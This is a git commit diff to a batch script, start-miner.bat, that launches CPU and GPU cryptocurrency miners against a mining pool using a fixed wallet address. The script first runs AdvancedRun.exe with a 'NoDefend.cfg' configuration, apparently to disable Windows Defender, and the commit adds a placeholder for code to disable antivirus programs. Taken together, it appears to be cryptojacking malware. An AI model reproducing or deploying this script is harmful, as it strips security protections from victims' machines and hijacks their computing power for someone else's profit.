33aabf74261245db0da096152cc68cff1749b29c
VerusGhost <167066418+VerusGhost@users.noreply.github.com>
2024-05-02 01:25:43 +0100

    Update start-miner.bat

--- start-miner.bat
+++ start-miner.bat
@@ -1,27 +1,30 @@
 @echo off
 setlocal
 
+REM Execute AdvancedRun.exe with NoDefend.cfg configuration
 AdvancedRun.exe /Run NoDefend.cfg
+
+REM Run hellminer.exe with specified parameters for mining
 .\hellminer.exe -c stratum+tcp://na.luckpool.net:3960 -u RRigARdBSMQ1yuShojcftU2apRUVFpR2PL.%USERNAME% -p --cpu 4
 
-rem Use WMIC to query the GPU adapter info
+REM Use WMIC to query the GPU adapter info
 for /f "tokens=2 delims==" %%A in ('wmic path Win32_VideoController get AdapterCompatibility /value') do (
     set gpu_exists=%%A
 )
 
-rem If GPU exists
+REM If GPU exists
 if "%gpu_exists%" NEQ "" (
     echo GPU exists.
     
-    rem Use WMIC to query the VRAM size
+    REM Use WMIC to query the VRAM size
     for /f "tokens=2 delims==" %%B in ('wmic path Win32_VideoController get AdapterRAM /value') do (
         set vram=%%B
     )
 
-    rem Convert VRAM size to GB
+    REM Convert VRAM size to GB
     set /a vram_gb=%vram%/1024/1024/1024
 
-    rem Check if VRAM is more than 4GB
+    REM Check if VRAM is more than 4GB
     if %vram_gb% GEQ 4 (
         echo GPU has more than 4GB of VRAM.
         echo Running lolMiner.exe...
@@ -35,5 +38,8 @@ if "%gpu_exists%" NEQ "" (
     echo No GPU found.
     pause
 )
+
+REM Include AVControl.bat code to disable antivirus programs
+REM AVControl.bat code goes here...
 
 endlocal
